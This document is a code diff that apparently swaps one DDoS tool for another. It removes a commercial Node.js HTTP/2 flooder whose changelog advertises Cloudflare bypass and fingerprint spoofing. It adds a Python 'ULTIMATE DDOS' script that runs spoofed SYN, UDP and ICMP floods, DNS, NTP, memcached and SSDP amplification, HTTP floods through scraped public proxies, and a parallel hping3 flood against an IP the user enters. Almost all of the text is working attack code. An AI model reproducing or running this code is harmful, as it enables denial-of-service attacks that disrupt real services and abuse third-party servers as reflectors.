@@ -1,1407 +1,414 @@
-/*
-    JS PENGUIN 1.6
+import os
+import sys
+import time
+import random
+import socket
+import struct
+import threading
+import multiprocessing
+import subprocess
+import json
+import requests
+from pathlib import Path
+from ctypes import CDLL, create_string_buffer, c_int, c_void_p, byref, cast, POINTER, Structure, c_uint32, c_uint16, c_uint8
+from ctypes.util import find_library
+from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor
 
-    Node: v22.9.0
-    OS: Ubuntu 22.08
-    安装: npm install hpack https commander colors
+CONFIG = {
+    "target_ip": "",
+    "target_port": 80,
+    "threads_per_process": 200,
+    "num_processes": 0,          # 0 = tự động = CPU core
+    "duration": 0,
+    "use_proxy": True,
+    "fallback_to_own_ip": True,
+    "use_hping3": True,
+    "proxy_scan_interval": 60,
+    "http_ratio": 0.5,
+    "raw_modes": ["syn","udp","icmp","dns","ntp","memcached","ssdp"],
+    "max_proxy_fails": 3,
+    "proxy_timeout": 3,
+    "proxy_sources": [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
+        "https://www.proxy-list.download/api/v1/get?type=socks5",
+        "https://www.proxy-list.download/api/v1/get?type=http",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+        "https://api.openproxylist.xyz/socks5.txt",
+        "https://api.openproxylist.xyz/http.txt",
+        "https://proxyspace.pro/proxies.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/socks5.txt"
+    ],
+    "dns_servers": ["8.8.8.8","1.1.1.1","8.8.4.4","1.0.0.1","9.9.9.9","208.67.222.222","208.67.220.220"],
+    "ntp_servers": ["0.pool.ntp.org","1.pool.ntp.org","2.pool.ntp.org","3.pool.ntp.org"],
+    "memcached_servers": [],
+    "ssdp_multicast": "239.255.255.250"
+}
 
-    ATLAS corporation (t.me/atlasapi)
-    开发者: Benshii (t.me/benshii)
-    日期: 2025年1月16日
+packet_counter = multiprocessing.Value('Q', 0)  # 64-bit unsigned
+error_counter = multiprocessing.Value('Q', 0)
+proxy_list_shared = None  # sẽ được gán sau
 
-    ———————————————————————————————————————————
+def get_user_input():
+    print("\n" + "="*60)
+    print("   ULTIMATE DDOS – Interactive Setup")
+    print("="*60)
+    CONFIG["target_ip"] = input("Target IP (vd: 1.2.3.4): ").strip()
+    if not CONFIG["target_ip"]:
+        print("[!] IP không được bỏ trống.")
+        sys.exit(1)
+    CONFIG["target_port"] = int(input("Target Port (mặc định 80): ") or "80")
+    CONFIG["threads_per_process"] = int(input("Số luồng mỗi tiến trình (mặc định 200): ") or "200")
+    cpu = os.cpu_count() or 4
+    CONFIG["num_processes"] = int(input(f"Số tiến trình (0 = tự động = {cpu}, mặc định 0): ") or "0")
+    if CONFIG["num_processes"] == 0:
+        CONFIG["num_processes"] = cpu
+    CONFIG["duration"] = int(input("Thời gian chạy (giây, 0 = vô hạn, mặc định 0): ") or "0")
+    CONFIG["use_proxy"] = input("Dùng proxy? (y/n, mặc định y): ").lower() != 'n'
+    CONFIG["fallback_to_own_ip"] = input("Fallback sang IP thật khi hết proxy? (y/n, mặc định y): ").lower() != 'n'
+    CONFIG["use_hping3"] = input("Dùng hping3 song song? (y/n, mặc định y): ").lower() != 'n'
+    print("="*60)
+    print("[*] Cấu hình đã nhận:")
+    for k, v in CONFIG.items():
+        if k not in ["proxy_sources","dns_servers","ntp_servers","memcached_servers"]:
+            print(f"    {k}: {v}")
+    print("="*60)
+    return CONFIG
 
-    由ATLAS API公司发布 (atlasapi.co)
+# ---------------------- QUÉT PROXY (ĐA LUỒNG) -------------------------
+def fetch_proxies_parallel():
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    proxies = set()
+    def get_from_url(url):
+        try:
+            r = requests.get(url, timeout=10)
+            if r.status_code == 200:
+                lines = r.text.splitlines()
+                res = []
+                for line in lines:
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        if '://' in line:
+                            line = line.split('://')[1]
+                        res.append(line)
+                return res
+        except:
+            return []
+        return []
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(get_from_url, url) for url in CONFIG["proxy_sources"]]
+        for f in as_completed(futures):
+            for p in f.result():
+                proxies.add(p)
+    # Lọc nhanh chất lượng (ping < 200ms)
+    good = []
+    for p in list(proxies)[:3000]:
+        try:
+            ip, port = p.split(':')
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            start = time.time()
+            sock.connect((ip, int(port)))
+            sock.close()
+            if time.time() - start < 0.2:
+                good.append(p)
+        except:
+            pass
+    with open("proxies.txt", 'w') as f:
+        for p in good:
+            f.write(p + "\n")
+    return good
+_libc = None
+try:
+    _libc = CDLL(find_library("c"))
+    _libc.sendto.argtypes = [c_int, c_void_p, c_int, c_int, c_void_p, c_int]
+    _libc.sendto.restype = c_int
+except:
+    _libc = None
 
-    感谢您购买此脚本。
+def send_raw_fast(sock, packet, dest_ip, dest_port):
+    global packet_counter
+    try:
+        if _libc:
+            # Tạo sockaddr_in
+            addr = struct.pack('=H4s', socket.AF_INET, socket.inet_aton(dest_ip))
+            # Gửi qua libc
+            ret = _libc.sendto(sock.fileno(), packet, len(packet), 0, addr, len(addr))
+        else:
+            ret = sock.sendto(packet, (dest_ip, dest_port))
+        if ret > 0:
+            with packet_counter.get_lock():
+                packet_counter.value += 1
+        return ret
+    except:
+        with error_counter.get_lock():
+            error_counter.value += 1
+        return -1
 
-    1.1 更新日志:
-    - 添加重定向处理器
-    - 添加cookie解析器
-    - 修复更新头信息
-    - 添加代理连接统计
-    - 移除UAM选项
+# (SYN, UDP, ICMP, DNS, NTP, Memcached, SSDP) với send_raw_fast
+
+def syn_flood(target_ip, target_port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        # Tạo packet mẫu (tối giản)
+        while True:
+            src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            sport = random.randint(1024,65535)
+            seq = random.randint(0,2**32-1)
+            # Packet 40 bytes (IP+TCP) – tạo nhanh
+            pkt = b'\x45\x00\x00\x28' + struct.pack('!HH', random.randint(0,65535), 0)  # IP header cơ bản
+            pkt += struct.pack('!BBH', 255, 6, 0)  # TTL, protocol, checksum 0
+            pkt += socket.inet_aton(src) + socket.inet_aton(target_ip)
+            # TCP header
+            pkt += struct.pack('!HHIIBBHHH', sport, target_port, seq, 0, 0x50, 0x02, 65535, 0, 0)
+            # Checksum bỏ qua cho nhanh (một số router không check)
+            send_raw_fast(sock, pkt, target_ip, target_port)
+    except:
+        pass
+
+def udp_flood(target_ip, target_port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(65507)
+    while True:
+        send_raw_fast(sock, data, target_ip, target_port)
+
+def icmp_flood(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
+    while True:
+        send_raw_fast(sock, pkt, target_ip, 0)
+
+def dns_amp(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    domain = 'isc.org'
+    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
+    for part in domain.split('.'):
+        q += bytes([len(part)]) + part.encode()
+    q += b'\x00' + struct.pack('!HH', 1, 1)
+    servers = CONFIG["dns_servers"]
+    while True:
+        s = random.choice(servers)
+        send_raw_fast(sock, q, s, 53)
+
+def ntp_amp(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
+    servers = CONFIG["ntp_servers"]
+    while True:
+        s = random.choice(servers)
+        send_raw_fast(sock, q, s, 123)
+
+def memcached_amp(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    q = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
+    servers = CONFIG["memcached_servers"] or ['1.2.3.4']  # thay bằng list thực
+    while True:
+        s = random.choice(servers)
+        send_raw_fast(sock, q, s, 11211)
+
+def ssdp_amp(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
+    msg = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
+    while True:
+        send_raw_fast(sock, msg.encode(), CONFIG["ssdp_multicast"], 1900)
+
+def http_flood(proxy, target_ip, target_port):
+    try:
+        if '://' in proxy: proxy = proxy.split('://')[1]
+        p_ip, p_port = proxy.split(':')
+        p_port = int(p_port)
+        proxy_dict = {
+            'http': f'socks5://{p_ip}:{p_port}',
+            'https': f'socks5://{p_ip}:{p_port}'
+        }
+        if 'http' in proxy.lower():
+            proxy_dict = {'http': f'http://{p_ip}:{p_port}', 'https': f'http://{p_ip}:{p_port}'}
+        url = f"http://{target_ip}:{target_port}/"
+        headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
+        while True:
+            try:
+                requests.get(url, proxies=proxy_dict, headers=headers, timeout=CONFIG["proxy_timeout"])
+                requests.post(url, proxies=proxy_dict, headers=headers, data={'x':random.randint(1,9999)}, timeout=CONFIG["proxy_timeout"])
+                with packet_counter.get_lock():
+                    packet_counter.value += 2  # tính mỗi request là 1 gói
+            except:
+                with error_counter.get_lock():
+                    error_counter.value += 1
+    except:
+        pass
+
+def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_ref):
+    fail_count = {}
+    while True:
+        proxy = None
+        if CONFIG["use_proxy"] and proxy_list_ref:
+            if len(proxy_list_ref) > 0:
+                proxy = random.choice(proxy_list_ref)
+                if proxy and fail_count.get(proxy, 0) >= CONFIG["max_proxy_fails"]:
+                    try:
+                        proxy_list_ref.remove(proxy)
+                    except:
+                        pass
+                    proxy = None
+        if proxy:
+            if mode == 'http':
+                http_flood(proxy, target_ip, target_port)
+            else:
+                # Các mode raw không dùng proxy, nhưng ta vẫn có thể dùng proxy để gửi? Không.
+                # Nếu mode raw mà có proxy, ta vẫn gửi trực tiếp (bỏ qua proxy)
+                pass
+        # Nếu không dùng proxy hoặc proxy fail, fallback
+        if not proxy or mode != 'http':
+            if CONFIG["fallback_to_own_ip"] or not CONFIG["use_proxy"]:
+                if mode == 'http':
+                    try:
+                        requests.get(f"http://{target_ip}:{target_port}/", timeout=1)
+                        with packet_counter.get_lock():
+                            packet_counter.value += 1
+                    except:
+                        with error_counter.get_lock():
+                            error_counter.value += 1
+                elif mode == 'syn':
+                    syn_flood(target_ip, target_port)
+                elif mode == 'udp':
+                    udp_flood(target_ip, target_port)
+                elif mode == 'icmp':
+                    icmp_flood(target_ip)
+                elif mode == 'dns':
+                    dns_amp(target_ip)
+                elif mode == 'ntp':
+                    ntp_amp(target_ip)
+                elif mode == 'memcached':
+                    memcached_amp(target_ip)
+                elif mode == 'ssdp':
+                    ssdp_amp(target_ip)
+            else:
+                time.sleep(0.05)
+
+def process_worker(target_ip, target_port, process_id, total_threads, proxy_manager_list):
+    # proxy_manager_list là list được chia sẻ qua Manager
+    proxy_list = proxy_manager_list
+    modes = ['http'] * int(total_threads * CONFIG["http_ratio"])
+    raw_modes = CONFIG["raw_modes"]
+    for _ in range(total_threads - len(modes)):
+        modes.append(random.choice(raw_modes))
+    random.shuffle(modes)
+    threads = []
+    for i, mode in enumerate(modes):
+        t = threading.Thread(target=worker_loop, args=(process_id, i, target_ip, target_port, mode, proxy_list), daemon=True)
+        t.start()
+        threads.append(t)
+    while True:
+        time.sleep(10)
+
+# ---------------------- DEBUG LOOP (HIỂN THỊ THỐNG KÊ) ---------------
+def debug_loop(packet_counter, error_counter, proxy_list_ref):
+    last_time = time.time()
+    last_packets = 0
+    while True:
+        time.sleep(5)
+        now = time.time()
+        elapsed = now - last_time
+        with packet_counter.get_lock():
+            pkt = packet_counter.value
+        with error_counter.get_lock():
+            err = error_counter.value
+        pps = (pkt - last_packets) / elapsed if elapsed > 0 else 0
+        last_packets = pkt
+        last_time = now
+        proxy_count = len(proxy_list_ref) if proxy_list_ref else 0
+        print(f"[DEBUG] {time.strftime('%H:%M:%S')} | Tổng gói: {pkt:,} | Lỗi: {err:,} | Tốc độ: {pps:,.0f} pps | Proxy: {proxy_count}")
+
+def main():
+    # Nhập thông số
+    get_user_input()
     
-    1.2 更新日志:
-    - 添加配置加载功能
-
-    1.3 更新日志:
-    - 修复随机路径
-    - 支持Socks4/5
-    - 优化代码
-    - 更新随机速率
-
-    1.4 更新日志:
-    - 更快的请求速度
-    - 新的代理类
-    - 额外的头信息
-    - 新的速率限制处理器
-    - 随机TLS设置
-    - 改进的指纹
-    - HTTP2请求队列
+    target_ip = CONFIG["target_ip"]
+    target_port = CONFIG["target_port"]
+    num_proc = CONFIG["num_processes"]
+    threads_per_proc = CONFIG["threads_per_process"]
+    total_threads = num_proc * threads_per_proc
+    duration = CONFIG["duration"]
     
-    1.5 更新日志:
-    - 绕过Cloudflare HTTPD0S
-    - 支持HTTP, HTTP/1.1和HTTP/2
-    - 支持代理身份验证
-    - 与浏览器脚本兼容
-    - 可选的TLS Chrome指纹
-    - 高级随机速率系统选项
-    - 可选随机路径/速率限制模式
-    - 支持socks4/5和http/s代理
-    - 更新的随机cookie系统
+    print(f"\n[*] Khởi tạo với {num_proc} tiến trình, {total_threads} luồng.")
+    print("[*] Đang quét proxy lần đầu...")
     
-    1.6 更新日志:
-    - 新的HTTPDD0S绕过功能
-    - 伪造Akamai指纹
-    - 修复JA3 TLS指纹
-    - 更新速率限制处理器
-    - 添加新的cookie模式
-    - 更新速率限制处理器
-    - 新的缓存绕过选项
-    - 更新指纹选项
-    - 新的和更新的头信息
-    - 更新随机路径选项
-    - 自动检测代理协议
-    - 调试数据帧选项
-    - 更新快速重置选项
-    - 更新密码和签名算法
-    - 自适应http2设置
-    - 从API获取代理
-
-    即将推出
-*/
-
-const net = require('net');
-const tls = require('tls');
-const HPACK = require('hpack');
-const cluster = require('cluster');
-const fs = require('fs');
-const os = require('os');
-const crypto = require('crypto');
-const colors = require('colors');
-const { Command } = require('commander');
-const socks = require('socks').SocksClient;
-// console.log(headerGenerator.getHeaders())
-
-process.setMaxListeners(0);
-
-process.on('uncaughtException', function (e) {
-    // console.log(e)
-});
-process.on('unhandledRejection', function (e) {
-    // console.log(e)
-});
-
-const options = new Command();
-options
-    .option('-m, --method <method>', '请求方法 <GET/POST/...>')
-    .option('-u, --target <url>', '目标URL <http/https>')
-    .option('-s, --time <seconds>', '攻击持续时间 <秒>', 120) 
-    .option('-t, --threads <number>', '线程数量 <整数>', 4)
-    .option('-r, --rate <rate>', '每秒请求数 <整数>', 60)
-
-    .option('-p, --proxy <proxy>', '代理文件 <路径>')
-    .option('-T, --type <proxytype>', '代理类型 <http/socks4/socks5>', 'http')
-    .option('-d, --debug <debug>', '调试模式 <true/false>', true)
-
-    .option('-v, --http <version>', 'http版本 <1/2>', 2)
-    .option('--full <full>', '完整头信息 <true/false>', false)
-    .option('--extra <extra>', '额外头信息 <true/false>', false)
-    .option('--delay <delay>', '请求间延迟 <毫秒>', 10)
-    .option('-D, --data <data>', '请求数据 <字符串/RAND>')
-    .option('--cache', '绕过缓存 <true/false>', false)
-    .option('--close <close>', '关闭坏代理 <true/false>', false)
-    .option('--conns <conns>', '连接限制 <1/10000>')
-
-    .option('-q, --query <query>', '生成随机查询 <true/false>', false)
-    .option('--randrate <randrate>', '随机请求速率 <1-128/60-90>', "")
-    .option('--randpath <randpath>', '随机URL路径 <true/false>', false)
-    .option('--ratelimit <ratelimit>', '速率限制模式 <true/false>', false)
-
-    .option('-I, --ip <ip:port>', 'IP地址 <ipv4>')
-    .option('-U, --ua <agent>', '用户代理头信息 <字符串>')
-    .option('-C, --cookie <cookie>', 'Cookie <字符串/RAND>')
-
-    .option('-F, --fingerprint <fp>', 'TLS指纹 <true/false>', false)
-    .option('-R, --referer <referer>', '引用URL <url/RAND>')
-
-    .option('--checker <checker>', '代理检查器', false)
-
-    .option('--config <file>', '加载配置 <文件.json>')
-
-    .parse(process.argv);
-
-    if (options.opts().config && typeof options.opts().config === 'string') {
-        try {
-            const config_options = fs.readFileSync(options.config, 'utf8');
-            const config = JSON.parse(config_options);
-            Object.keys(config).forEach(key => {
-                if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
-                    options[key] = config[key];
-                }
-            });
-        } catch (error) {
-            console.error(`Error loading config: ${error.message}`);
-            process.exit(0)
-        }
-    }
-
-
+    # Tạo Manager để chia sẻ proxy list
+    manager = multiprocessing.Manager()
+    proxy_list = manager.list()
+    initial = fetch_proxies_parallel()
+    for p in initial:
+        proxy_list.append(p)
+    print(f"[*] Đã có {len(proxy_list)} proxy chất lượng.")
     
-const opts = options.opts();
-
-require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
-
-if (!options.opts().method || !options.opts().target || !options.opts().proxy) {
-    options.help();
-    process.exit(1);
-}
-
-// const opts = options.opts();
-var reqmethod = opts.method || "GET";
-const target = opts.target;
-const time = opts.time || 120;
-const threads = opts.threads;
-const ratelimit = opts.rate || 60;
-const proxyfile = opts.proxy;
-const proxytype = opts.type;
-const debug = opts.debug || false;
-
-const http_opt = parseInt(opts.http) || 2;
-const full_headers = opts.full || false;
-const extra_headers = opts.extra || false;
-const delay_opt = opts.delay || 10;
-const data_opt = opts.data || undefined;
-const cache_opt = opts.cache;
-const close_opt = opts.close;
-
-const query_opt = opts.query || false;
-const randrate = opts.randrate;
-const randpath = opts.randpath || false;
-const ratelimit_opt = opts.ratelimit;
-
-const fingerprint_opt = opts.fingerprint || true;
-const referer_opt = opts.referer || false;
-
-const ip_opt = opts.ip || undefined;
-const ua_opt = opts.ua || undefined;
-const checker = opts.checker || false;
-const connections = opts.conns;
-var cookie_opt = opts.cookie || undefined;
-
-// const uam_opt = opts.uam || false;
-
-const status_queue = []
-let status_codes = {}
-
-const url = new URL(target);
-const protocol = url.protocol.replace(":", "");
-const port = url.port || (url.protocol === 'https:' ? 443 : 80);
-
-const request_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'RAND']
-
-const SettingHeaderTableSize = 0x1;
-const SettingEnablePush = 0x2;
-const SettingInitialWindowSize = 0x4;
-const SettingMaxHeaderListSize = 0x6;
-
-if (!proxyfile) {
-    console.error("Proxy file is missing!");
-    process.exit(1);
-}
-
-const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
-
-if (!request_methods.includes(reqmethod)) {
-    console.error('Invalid request method!');
-    process.exit(1);
-}
-
-if (!['http', 'https', 'socks4', 'socks5'].includes(proxytype)) {
-    console.error('Invalid proxytype! (http/socks4/socks5)');
-    process.exit(1);
-}
-
-function random_string(length) {
-    const characters = 'abcdefghijklmnopqrstuvwxyz';
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
-    }
-    return result;
-}
-
-
-function random_int(minimum, maximum) {
-    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
-}
-
-function random_cookies() {
-    let cookies = "";
-    const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
-        
-    const cookie_limit = random_int(1, cookie_names.length);
-    for (var x = 0; x < cookie_limit; x++) {
-        const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
-        const cookie_index = cookie_names.indexOf(cookie_name);
-        if (cookie_index > -1) {
-            cookie_names.splice(cookie_index, 1);
-        }
-        const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
-        cookies += `${cookie_name}=${cookie_value}`;
-        if (x+1 < cookie_limit) {
-            cookies += '; ';
-        }
-    }
-}
-
-function random_ip() {
-    return `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`;
-}
-
-const ciphers = [
-    "TLS_GREASE",
-    "TLS_AES_128_GCM_SHA256",
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_CHACHA20_POLY1305_SHA256",
-    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
-    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
-    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
-    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
-    "TLS_RSA_WITH_AES_128_GCM_SHA256",
-    "TLS_RSA_WITH_AES_256_GCM_SHA384",
-    "TLS_RSA_WITH_AES_128_CBC_SHA",
-    "TLS_RSA_WITH_AES_256_CBC_SHA"
-].join(":");
-
-const curves = [
-    "X25519",
-    "P-256",
-    "P-384"
-].join(":");
-
-const sigalgs = [
-    "ecdsa_secp256r1_sha256",
-    "rsa_pss_rsae_sha256",
-    "rsa_pkcs1_sha256",
-    "ecdsa_secp384r1_sha384",
-    "rsa_pss_rsae_sha384",
-    "rsa_pkcs1_sha384",
-    "rsa_pss_rsae_sha512",
-    "rsa_pkcs1_sha512"
-].join(":");
-
-const versions = [
-    "TLSv1.3",
-    "TLSv1.2"
-]
-
-const languages = [
-    "en-US,en;q=0.9",
-    "en-GB,en;q=0.9",
-];
-
-const encodings = [
-    "gzip, deflate, br, zstd",
-    "gzip, deflate, br"
-]
-
-const ssl_versions = ['771', '772', '773']; 
-const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
-const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
-const elliptic_curves = ['4588', '29', '23', '24'];
-
-class Proxy {
-    constructor(host, port, type) {
-      this.host = host;
-      this.port = parseInt(port);
-      this.type = type;
-      this.socket = null;
-    }
-  
-    connect(options = {}) {
-      return new Promise((resolve, reject) => {
-        if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
-          this.socks(url.hostname, port, options)
-            .then(resolve)
-            .catch(reject);
-        } else if (this.type === 'HTTP' || this.type === 'HTTPS') {
-        this.http(options)
-          .then(resolve)
-          .catch(reject);
-        } else {
-          reject(new Error('Invalid proxy type'));
-        }
-      });
-    }
-  
-    socks(options) {
-        return new Promise((resolve, reject) => {
-            socks.createConnection({
-                proxy: {
-                    host: this.host,
-                    port: this.port,
-                    type: this.type === 'SOCKS5' ? 5 : 4,
-                    ...(options.username && options.password && { userId: options.username, password: options.password }),
-                },
-                command: 'connect',
-                destination: { host: url.hostname, port: port },
-                timeout: options.timeout || 10000,
-            }, (error, info) => {
-                if (error) {
-                    return reject(new Error(`SOCKS connection error: ${error.message}`));
-                }
-                this.socket = info.socket;
-                resolve(info.socket);
-            });
-        });
-    }
-  
-    http(options) {
-        return new Promise((resolve, reject) => {
-            const socket = net.connect({host: this.host, port: this.port}, () => {
-                const request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n`;
-                const auth_header = options.username && options.password
-                    ? `Proxy-Authorization: Basic ${Buffer.from(`${options.username}:${options.password}`).toString('base64')}\r\n`
-                    : '';
-  
-                socket.write(`${request_header}${auth_header}\r\n`);
-            });
-  
-            socket.on('data', (data) => {
-            const response = data.toString('utf8');
-            if (response.includes('HTTP/1.1 200')) {
-                this.socket = socket;
-                resolve(socket);
-            } else {
-                socket.destroy();
-                reject(new Error(`Bad proxy response: ${response}`));
-            }
-            });
+    # Lưu tham chiếu toàn cục để debug
+    global proxy_list_shared
+    proxy_list_shared = proxy_list
     
-            socket.on('timeout', () => {
-                socket.destroy();
-                reject(new Error('Connection timeout'));
-            });
+    # Hàm cập nhật proxy định kỳ (chạy ở tiến trình riêng)
+    def proxy_updater(proxy_list):
+        while True:
+            time.sleep(CONFIG["proxy_scan_interval"])
+            new_proxies = fetch_proxies_parallel()
+            del proxy_list[:]
+            for p in new_proxies:
+                proxy_list.append(p)
+            print(f"[*] Cập nhật proxy: {len(proxy_list)}")
+    updater = multiprocessing.Process(target=proxy_updater, args=(proxy_list,), daemon=True)
+    updater.start()
     
-            socket.on('error', (err) => {
-                socket.destroy();
-                reject(new Error(`Connection error: ${err.message}`));
-            });
+    # Nếu dùng hping3, chạy song song
+    if CONFIG["use_hping3"]:
+        def hping3_worker():
+            while True:
+                cmd = f"hping3 -S -p {target_port} --flood --rand-source {target_ip}"
+                subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(10)
+        hproc = multiprocessing.Process(target=hping3_worker, daemon=True)
+        hproc.start()
+        print("[*] Đã kích hoạt hping3 song song.")
     
-            socket.setTimeout(options.timeout || 10000);
-            socket.setKeepAlive(true, 60000);
-            socket.setMaxListeners(10 * 10 * 60);
-        });
-    }
-
-    close() {
-        if (this.socket) {
-            // console.log(`socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
-            this.socket.destroy();
-            this.socket.removeAllListeners();
-            // console.log(`killed: socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
-        }
-    }
-}
-
-class Http2 {
-    constructor(proxy) {
-        this.id = 1;
-        this.data = Buffer.alloc(0);
-        this.hpack = new HPACK();
-        // this.hpack.setTableSize(4096);
-        this.frames = [];
-        this.proxy = proxy;
-    }
-
-    static builder() {
-        return new Http2();
-    }
-
-    encode_frame(streamId, type, payload = "", flags = 0) {
-        this.id = streamId;
-        let frame = Buffer.alloc(9)
-        frame.writeUInt32BE(payload.length << 8 | type, 0)
-        frame.writeUInt8(flags, 4)
-        frame.writeUInt32BE(streamId, 5)
-        if (payload.length > 0)
-            frame = Buffer.concat([frame, payload])
-        return frame
-    }
-
-    decode_frame(data) {
-        const length_type = data.readUInt32BE(0)
-        const length = length_type >> 8
-        const type = length_type & 0xFF
-        const flags = data.readUint8(4)
-        const streamID = data.readUInt32BE(5)
-        const offset = flags & 0x20 ? 5 : 0
+    # Khởi động các tiến trình tấn công
+    processes = []
+    for i in range(num_proc):
+        p = multiprocessing.Process(target=process_worker, args=(
+            target_ip, target_port, i, threads_per_proc, proxy_list
+        ), daemon=True)
+        p.start()
+        processes.append(p)
+    print(f"[*] Đã khởi động {num_proc} tiến trình.")
     
-        let payload = Buffer.alloc(0)
+    # Chạy debug loop trong tiến trình chính
+    debug_thread = threading.Thread(target=debug_loop, args=(packet_counter, error_counter, proxy_list), daemon=True)
+    debug_thread.start()
     
-        if (length > 0) {
-            payload = data.subarray(9 + offset, 9 + offset + length)
-    
-            if (payload.length + offset != length) {
-                return null
-            }
-        }
-    
-        return {
-            streamID,
-            length,
-            type,
-            flags,
-            payload
-        }
-    }
-
-    encode_settings(settings) {
-        const data = Buffer.alloc(6 * settings.length)
-        for (let i = 0; i < settings.length; i++) {
-            data.writeUInt16BE(settings[i][0], i * 6)
-            data.writeUInt32BE(settings[i][1], i * 6 + 2)
-        }
-        return data
-    }
-}
-
-class Request {
-    constructor(path) {
-        this.path = path
-        this.headers = [];
-    }
-
-    static builder() {
-        return new Request();
-    }
-
-    set_path(path) {
-        this.path = path
-    }
-
-    add_header(header, value) {
-        const index = this.headers.findIndex(([key]) => key === header);
-        if (index !== -1) {
-            this.headers[index][1] = value;
-        } else {
-            this.headers.push([header, value]);
-        }
-        return this;
-    }
-
-    find_header(name) {
-        const header = this.headers.find(([k, _]) => k === name);
-        return header ? header[1] : null;
-    }
-
-    replace_header(k1, v1) {
-        const index = this.headers.findIndex(([k, _]) => k === k1);
-        if (index !== -1) {
-            this.headers[index][1] = v1;
-        }
-        return this;
-    }
-
-    add_headers(headers) {
-        for (const [key, value] of Object.entries(headers)) {
-            if (value !== null && value !== undefined) {
-                this.headers.push([key, value]);
-            }
-        }
-        return this;
-    }
-
-    generate_headers() {
-        this.headers = [];
-        const version = random_int(127, 131);
-        var brandValue, versionList, fullVersion;
-        switch (version) {
-            case 126:
-                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
-                break;
-            case 127:
-                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
